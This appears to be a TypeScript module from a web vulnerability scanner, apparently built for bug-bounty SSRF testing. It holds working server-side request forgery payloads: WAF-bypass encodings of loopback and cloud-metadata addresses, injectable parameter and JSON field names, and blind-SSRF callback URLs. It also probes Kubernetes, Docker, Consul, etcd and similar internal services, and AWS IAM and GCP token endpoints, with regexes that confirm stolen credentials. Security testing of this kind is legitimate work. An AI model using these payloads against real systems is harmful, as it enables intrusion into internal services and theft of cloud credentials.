import { randomUUID } from 'node:crypto';

export const SSRF_PAYLOADS = [
  'http://127.0.0.1',
  'http://localhost',
  'http://[::1]',
  'http://0.0.0.0',
  'http://169.254.169.254/latest/meta-data/',   // AWS metadata
  'http://metadata.google.internal/',            // GCP metadata
  'http://100.100.100.200/latest/meta-data/',    // Alibaba metadata
  'file:///etc/passwd',
  'http://127.0.0.1:22',                        // port scan
  'http://127.0.0.1:3000',                      // internal services
];

/** IP obfuscation payloads — bypass WAFs that block plain 127.0.0.1/localhost.
 *  These are alternate representations of 127.0.0.1 that many URL parsers resolve
 *  but naive string-matching WAFs don't catch. */
export const SSRF_OBFUSCATION_PAYLOADS = [
  // Numeric representations of 127.0.0.1
  'http://2130706433',                          // Decimal IP (127*2^24 + 0*2^16 + 0*2^8 + 1)
  'http://0x7f000001',                          // Hex IP
  'http://0177.0.0.1',                          // Octal IP
  'http://0177.0.0.01',                         // Octal with leading zeros
  'http://127.1',                               // Short form (omitted octets = 0)
  'http://127.0.1',                             // Short form (3 octets)
  'http://0',                                   // Zero IP → 0.0.0.0 (some systems → loopback)

  // IPv6 representations
  'http://[::ffff:127.0.0.1]',                  // IPv6-mapped IPv4
  'http://[0:0:0:0:0:ffff:127.0.0.1]',          // Full IPv6-mapped IPv4
  'http://[::ffff:7f00:1]',                     // IPv6-mapped hex

  // URL authority tricks
  'http://attacker.com@127.0.0.1',              // URL userinfo bypass
  'http://127.0.0.1#@attacker.com',             // Fragment confusion
  'http://127.0.0.1%00@attacker.com',           // Null byte in authority
  'http://127.0.0.1:80',                        // Explicit default port

  // DNS rebinding — domains that resolve to 127.0.0.1
  'http://localtest.me',                        // Resolves to 127.0.0.1
  'http://127.0.0.1.nip.io',                    // nip.io wildcard DNS
  'http://spoofed.127.0.0.1.nip.io',            // Subdomain variant

  // Cloud metadata obfuscation (169.254.169.254 alternates)
  'http://[::ffff:169.254.169.254]/latest/meta-data/',  // IPv6-mapped AWS metadata
  'http://2852039166/latest/meta-data/',                // Decimal 169.254.169.254
  'http://0xA9FEA9FE/latest/meta-data/',                // Hex 169.254.169.254
];

export const SSRF_PARAM_PATTERNS = /[?&](url|link|src|image|proxy|callback|fetch|load|uri|href|path|file|resource|target|site|page|data|webhook|redirect|return|dest|destination|endpoint|api|service|host|domain|address)=/i;

export const SSRF_INDICATORS = [
  /root:.*:0:0/,                  // /etc/passwd content
  /ami-id/i,                      // AWS metadata
  /instance-id/i,                 // Cloud metadata
  /meta-data/i,                   // Generic metadata
  /Connection refused/i,          // Internal port scan evidence
  /ECONNREFUSED/,                 // Node.js connection refused
  /No route to host/i,
  /EHOSTUNREACH/,                 // Node.js host unreachable
  /Could not fetch.*127\.0\.0\.1/i,  // Server-side fetch error for loopback
  /Could not fetch.*localhost/i,     // Server-side fetch error for localhost
  /Could not fetch.*\[::1\]/i,      // Server-side fetch error for IPv6 loopback
  /Could not fetch.*0x7f/i,         // Hex IP error
  /Could not fetch.*2130706433/i,   // Decimal IP error
  /Could not fetch.*localtest\.me/i, // DNS rebinding error
  /Could not fetch.*nip\.io/i,      // nip.io DNS rebinding error
];

/** JSON field names commonly used for server-side URL fetching.
 *  Used in POST/JSON body SSRF testing. */
export const SSRF_JSON_FIELD_NAMES = [
  'url', 'uri', 'link', 'href', 'src', 'source',
  'callback', 'callback_url', 'callbackUrl', 'webhook', 'webhookUrl', 'webhook_url',
  'redirect', 'redirect_url', 'redirectUrl', 'return_url', 'returnUrl',
  'proxy', 'proxy_url', 'proxyUrl',
  'fetch', 'fetch_url', 'fetchUrl',
  'image', 'imageUrl', 'image_url', 'avatar', 'avatarUrl', 'avatar_url',
  'icon', 'logo', 'thumbnail',
  'endpoint', 'target', 'destination', 'host',
];

/**
 * Generate callback-based SSRF payloads for blind SSRF detection.
 * Each payload gets a unique ID so the user can correlate hits on their
 * callback server (Burp Collaborator, interactsh, etc.) with injected payloads.
 */
export function generateCallbackPayloads(callbackUrl: string): string[] {
  // Normalize: strip trailing slash
  const base = callbackUrl.replace(/\/+$/, '');

  return [
    // Plain callback URL with unique path
    `${base}/ssrf-${randomUUID()}`,
    // Callback with a nested path to test path handling
    `${base}/ssrf-${randomUUID()}/probe`,
    // URL-encoded variant
    encodeURI(`${base}/ssrf-${randomUUID()}`),
    // With explicit port 80 (tests port normalization bypass)
    `${base}:80/ssrf-${randomUUID()}`,
    // With explicit port 443
    `${base}:443/ssrf-${randomUUID()}`,
  ];
}

/**
 * Get all SSRF payloads, optionally including callback-based payloads
 * for blind SSRF detection.
 */
export function getSSRFPayloads(callbackUrl?: string): string[] {
  if (!callbackUrl) {
    return [...SSRF_PAYLOADS];
  }
  return [...SSRF_PAYLOADS, ...generateCallbackPayloads(callbackUrl)];
}

/**
 * Get obfuscation payloads for WAF bypass testing.
 * Deep profile or WAF detected → full set. Standard → top 6 most effective.
 */
export function getObfuscationPayloads(profile: string, hasWaf?: boolean): string[] {
  if (profile === 'deep' || hasWaf) {
    return [...SSRF_OBFUSCATION_PAYLOADS];
  }
  // Standard profile: numeric representations + zero (most effective bypass techniques)
  return SSRF_OBFUSCATION_PAYLOADS.slice(0, 6);
}

/** Internal service probes — commonly exposed on cloud/container environments.
 *  Finding these via SSRF = critical bounty finding (cluster/service access). */
export const SSRF_INTERNAL_SERVICE_PROBES: Array<{ url: string; indicator: RegExp; service: string; severity: 'critical' | 'high' }> = [
  // Kubernetes API
  { url: 'https://kubernetes.default.svc/api', indicator: /"kind"|"versions"|"serverAddress"/i, service: 'Kubernetes API', severity: 'critical' },
  { url: 'https://kubernetes.default.svc:443/api/v1/namespaces', indicator: /"kind":"NamespaceList"|"items"/i, service: 'Kubernetes Namespaces', severity: 'critical' },
  { url: 'http://127.0.0.1:10250/pods', indicator: /"kind":"PodList"|"metadata"|"containers"/i, service: 'Kubelet API', severity: 'critical' },

  // Docker daemon (exposed socket or TCP)
  { url: 'http://127.0.0.1:2375/version', indicator: /"ApiVersion"|"Os"|"Arch"|"KernelVersion"/i, service: 'Docker Daemon', severity: 'critical' },
  { url: 'http://127.0.0.1:2375/containers/json', indicator: /"Id"|"Image"|"Command"|"Names"/i, service: 'Docker Containers', severity: 'critical' },
  { url: 'http://127.0.0.1:2376/version', indicator: /"ApiVersion"|"Os"/i, service: 'Docker TLS', severity: 'critical' },

  // Consul
  { url: 'http://127.0.0.1:8500/v1/agent/self', indicator: /"Config"|"Datacenter"|"NodeName"/i, service: 'Consul Agent', severity: 'high' },
  { url: 'http://127.0.0.1:8500/v1/kv/?recurse', indicator: /"Key"|"Value"|"CreateIndex"/i, service: 'Consul KV Store', severity: 'critical' },

  // etcd
  { url: 'http://127.0.0.1:2379/version', indicator: /"etcdserver"|"etcdcluster"/i, service: 'etcd', severity: 'critical' },
  { url: 'http://127.0.0.1:2379/v2/keys/', indicator: /"node"|"key"|"dir"/i, service: 'etcd Keys', severity: 'critical' },

  // Elasticsearch
  { url: 'http://127.0.0.1:9200/', indicator: /"cluster_name"|"tagline.*You Know, for Search"/i, service: 'Elasticsearch', severity: 'high' },
  { url: 'http://127.0.0.1:9200/_cat/indices', indicator: /green|yellow|red/i, service: 'Elasticsearch Indices', severity: 'high' },

  // Redis (HTTP proxy to Redis)
  { url: 'http://127.0.0.1:6379/', indicator: /DENIED|ERR.*command|redis_version/i, service: 'Redis', severity: 'high' },

  // CouchDB
  { url: 'http://127.0.0.1:5984/', indicator: /"couchdb"|"Welcome"/i, service: 'CouchDB', severity: 'high' },

  // Prometheus
  { url: 'http://127.0.0.1:9090/api/v1/status/config', indicator: /"status":"success"|"yaml"/i, service: 'Prometheus', severity: 'high' },

  // Grafana
  { url: 'http://127.0.0.1:3000/api/health', indicator: /"database":"ok"|"version"/i, service: 'Grafana', severity: 'high' },
];

/** Cloud metadata payloads — these target cloud provider metadata services.
 *  Each has a specific response pattern to confirm real access. */
export const CLOUD_METADATA_PROBES: Array<{ url: string; indicator: RegExp; cloud: string; severity: 'critical' }> = [
  // AWS IMDSv1 (no token required)
  { url: 'http://169.254.169.254/latest/meta-data/', indicator: /ami-id|instance-id|local-ipv4|hostname/i, cloud: 'AWS', severity: 'critical' },
  { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', indicator: /AccessKeyId|SecretAccessKey|Token|Expiration|arn:aws:iam/i, cloud: 'AWS IAM Role', severity: 'critical' },
  { url: 'http://169.254.169.254/latest/dynamic/instance-identity/document', indicator: /"instanceId"|"region"|"accountId"/i, cloud: 'AWS', severity: 'critical' },

  // GCP metadata
  { url: 'http://metadata.google.internal/computeMetadata/v1/', indicator: /instance\/|project\//i, cloud: 'GCP', severity: 'critical' },
  { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', indicator: /access_token/i, cloud: 'GCP Token', severity: 'critical' },

  // Azure IMDS
  { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', indicator: /"compute"|"network"/i, cloud: 'Azure', severity: 'critical' },

  // DigitalOcean
  { url: 'http://169.254.169.254/metadata/v1/', indicator: /droplet_id|hostname|region/i, cloud: 'DigitalOcean', severity: 'critical' },

  // Alibaba Cloud
  { url: 'http://100.100.100.200/latest/meta-data/', indicator: /instance-id|hostname/i, cloud: 'Alibaba', severity: 'critical' },
];
